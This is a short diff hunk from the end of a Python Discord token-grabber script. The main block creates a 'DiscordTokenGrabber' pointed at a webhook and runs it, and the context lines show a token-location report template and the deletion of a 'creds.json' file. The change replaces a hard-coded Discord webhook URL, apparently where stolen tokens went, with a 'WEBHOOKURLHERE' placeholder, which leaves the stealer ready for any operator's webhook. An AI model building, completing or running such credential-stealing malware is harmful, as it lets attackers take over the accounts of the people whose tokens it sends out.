@@ -360,6 +360,7 @@ Token Location: {platform}
             os.remove("creds.json")
 
 if __name__ == "__main__":
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1404598237725458442/oDij4blTghCGpj1wAOLBhgQKSWYfQnK-mF6fiqesOdiZaUIDU4BBsNfyV6M6Ha9ESzYp"  
+    WEBHOOK_URL = "WEBHOOKURLHERE"  
     grabber = DiscordTokenGrabber(WEBHOOK_URL)
+
     grabber.run()
